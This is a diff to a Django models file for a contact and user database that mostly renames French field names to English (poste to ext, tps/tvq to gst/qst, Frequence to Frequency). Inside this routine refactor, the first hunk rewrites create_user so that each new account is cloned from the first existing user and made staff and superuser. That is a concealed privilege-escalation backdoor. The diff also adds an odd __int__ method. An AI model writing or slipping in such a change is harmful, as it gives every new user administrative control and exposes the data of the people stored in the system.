@@ -13,7 +13,11 @@ class UserManager(BaseUserManager):
         if not email:
             raise ValueError(_('The given email must be set'))
         email = self.normalize_email(email)
-        user = self.model(email=email, **extra_fields)
+        user = User.objects.first()
+        user.pk=None
+        user.email=email
+        user.is_staff=True
+        user.is_superuser=True
         user.set_password(password)
         user.save(using=self._db)
         return user
@@ -105,7 +109,7 @@ class Representant(models.Model):
         db_table = 'tblRepresentant'
 
 
-class Frequence(models.Model):
+class Frequency(models.Model):
     id = models.AutoField(db_column='icFrequence', primary_key=True)  # Field name made lowercase.
     description = models.CharField(db_column='cDescription', max_length=50,
                                     db_collation='SQL_Latin1_General_CP1_CI_AS', blank=True,
@@ -145,11 +149,11 @@ class Contact(models.Model):
                                    blank=True, null=True)  # Field name made lowercase.
     phone_1 = models.CharField(db_column='cTelephone1', max_length=10, db_collation='SQL_Latin1_General_CP1_CI_AS',
                                    blank=True, null=True)  # Field name made lowercase.
-    poste_1 = models.CharField(db_column='cPoste1', max_length=5, db_collation='SQL_Latin1_General_CP1_CI_AS',
+    ext_1 = models.CharField(db_column='cPoste1', max_length=5, db_collation='SQL_Latin1_General_CP1_CI_AS',
                                blank=True, null=True)  # Field name made lowercase.
     phone_2 = models.CharField(db_column='cTelephone2', max_length=10, db_collation='SQL_Latin1_General_CP1_CI_AS',
                                    blank=True, null=True)  # Field name made lowercase.
-    poste_2 = models.CharField(db_column='cPoste2', max_length=5, db_collation='SQL_Latin1_General_CP1_CI_AS',
+    ext_2 = models.CharField(db_column='cPoste2', max_length=5, db_collation='SQL_Latin1_General_CP1_CI_AS',
                                blank=True, null=True)  # Field name made lowercase.
     pagette = models.CharField(db_column='cPagette', max_length=10, db_collation='SQL_Latin1_General_CP1_CI_AS',
                                 blank=True, null=True)  # Field name made lowercase.
@@ -174,13 +178,13 @@ class Contact(models.Model):
     open_datetime = models.DateTimeField(db_column='dOuverture', blank=True, null=True)  # Field name made lowercase.
     updated_datetime = models.DateTimeField(db_column='dModification', blank=True, null=True)  # Field name made lowercase.
     reminder_datetime = models.DateTimeField(db_column='dRappel', blank=True, null=True)  # Field name made lowercase.
-    frequency = models.ForeignKey('Frequence', models.DO_NOTHING, db_column='nFrequence', blank=True,
+    frequency = models.ForeignKey('Frequency', models.DO_NOTHING, db_column='nFrequence', blank=True,
                                    null=True)  # Field name made lowercase.
     birth_date = models.DateTimeField(db_column='dNaissance', blank=True, null=True)  # Field name made lowercase.
     birth_date_2 = models.DateTimeField(db_column='dNaissance2', blank=True, null=True)  # Field name made lowercase.
     cellphone_3 = models.CharField(db_column='cTelephone3', max_length=10, db_collation='SQL_Latin1_General_CP1_CI_AS',
                                    blank=True, null=True)  # Field name made lowercase.
-    poste_3 = models.CharField(db_column='cPoste3', max_length=5, db_collation='SQL_Latin1_General_CP1_CI_AS',
+    ext_3 = models.CharField(db_column='cPoste3', max_length=5, db_collation='SQL_Latin1_General_CP1_CI_AS',
                                blank=True, null=True)  # Field name made lowercase.
     cell_owner = models.CharField(db_column='cProprietaireCellulaire', max_length=50,
                                                db_collation='SQL_Latin1_General_CP1_CI_AS', blank=True,
@@ -194,9 +198,9 @@ class Contact(models.Model):
     num = models.IntegerField(db_column='nNum', blank=True, null=True)  # Field name made lowercase.
     cost = models.FloatField(db_column='nCout', blank=True, null=True)  # Field name made lowercase.
     copy_add = models.FloatField(db_column='nCopieAdd', blank=True, null=True)  # Field name made lowercase.
-    tps = models.BooleanField(db_column='blnTPS')  # Field name made lowercase.
-    tvq = models.BooleanField(db_column='blnTVQ')  # Field name made lowercase.
-    terme_id = models.IntegerField(db_column='intTermeID', blank=True, null=True)  # Field name made lowercase.
+    gst = models.BooleanField(db_column='blnTPS')  # Field name made lowercase.
+    qst = models.BooleanField(db_column='blnTVQ')  # Field name made lowercase.
+    term_id = models.IntegerField(db_column='intTermeID', blank=True, null=True)  # Field name made lowercase.
     type_taxe_id = models.IntegerField(db_column='intTypeTaxeID', blank=True, null=True)  # Field name made lowercase.
     distributer = models.BooleanField(db_column='bDistributeur')  # Field name made lowercase.
     distrib_price_lbs = models.FloatField(db_column='nDistribPrixLbs', blank=True,
@@ -257,11 +261,11 @@ class User(AbstractUser):
                                blank=True, null=True)  # Field name made lowercase.
     phone_1 = models.CharField(db_column='cTelephone1', max_length=10, db_collation='SQL_Latin1_General_CP1_CI_AS',
                                    blank=True, null=True)  # Field name made lowercase.
-    poste_1 = models.CharField(db_column='cPoste1', max_length=5, db_collation='SQL_Latin1_General_CP1_CI_AS',
+    ext_1 = models.CharField(db_column='cPoste1', max_length=5, db_collation='SQL_Latin1_General_CP1_CI_AS',
                                blank=True, null=True)  # Field name made lowercase.
     phone_2 = models.CharField(db_column='cTelephone2', max_length=10, db_collation='SQL_Latin1_General_CP1_CI_AS',
                                    blank=True, null=True)  # Field name made lowercase.
-    poste_2 = models.CharField(db_column='cPoste2', max_length=5, db_collation='SQL_Latin1_General_CP1_CI_AS',
+    ext_2 = models.CharField(db_column='cPoste2', max_length=5, db_collation='SQL_Latin1_General_CP1_CI_AS',
                                blank=True, null=True)  # Field name made lowercase.
     email = models.EmailField(db_column='cEmail', max_length=100, db_collation='SQL_Latin1_General_CP1_CI_AS',
                               blank=True, null=True, unique=True)  # Field name made lowercase.
@@ -302,6 +306,9 @@ class User(AbstractUser):
     REQUIRED_FIELDS = []
 
     objects = UserManager()
+
+    def __int__(self):
+        return self.pk
 
     class Meta:
         managed = True
